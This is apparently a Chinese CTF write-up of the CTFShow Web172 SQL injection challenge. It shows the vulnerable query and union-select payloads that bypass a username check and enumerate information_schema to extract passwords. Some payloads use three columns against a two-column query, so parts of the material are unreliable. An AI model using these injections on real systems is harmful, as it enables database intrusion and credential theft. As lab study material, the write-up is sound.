
[[ctfshow_入门_web_sql由此开始]]
# CTFShow Web172 · SQL 注入复盘



#SQLi #UnionSelect #InformationSchema #CTFShow

VULN SNAPSHOT

## 题目关键代码

```
$sql = "select username,password from user
where username != 'flag' and id = '".$_GET['id']."' limit 1;";

if($row->username !== 'flag'){
  $ret['msg'] = '查询成功';
}
```

核心点：后端只检查 `username` 是否等于 `flag`，并不检查密码值来源。

APPROACH 01

### 改名绕过 推荐

直接把查询到的 `flag` 用户名改造为其他字符串，通过判定逻辑。

```
' union select concat(username,'114'),password
from ctfshow_user2 where username='flag' --+
```

APPROACH 02

### 不读 username 字段

既然只校验 `username`，就让第一列返回无害常量，敏感信息放第二列。

```
' union select 1,password from ctfshow_user2 --+
```

APPROACH 03

### 信息架构爆破链 复习向

**1.** 可选枚举数据库：`information_schema.schemata`

**2.** 确认当前库：`select database();` → `ctfshow_web`

**3.** 枚举表：`information_schema.tables` 找到 `ctfshow_user2`

**4.** 枚举字段：`information_schema.columns` 锁定 `password`

```
' union select id,username,password from ctfshow_user2 --+
```
 **其实 `information_schema.columns` 里面就包含了 `库，表，字段` ,没必要麻烦去访问其他的schema表**


### 我踩过的坑 高频误区

爆字段时误混入 `mysql.user`，出现大量权限字段（Host/User/Select_priv...）。

原因：未限制 `table_schema`，导致同名表跨库混查。

```
-- 错误示例（范围过大）
' union select group_concat(column_name),1,1
from information_schema.columns where table_name='user' --+

-- 更稳妥：增加库限定
... and table_schema='ctfshow_web'
```


### 关于 ORDER BY 的纠偏

我之前误以为 `order by n` 对应表的原始字段数；实际上它依赖的是**当前 SELECT 结果列数**。如果原查询只选两列，就不能按 3 排序。

总结：这题本质是「结果检查点单薄」导致的绕过。只要控制返回列并避开 `username='flag'` 判定，就能稳定拿到目标数据；关键是明确列位与库范围。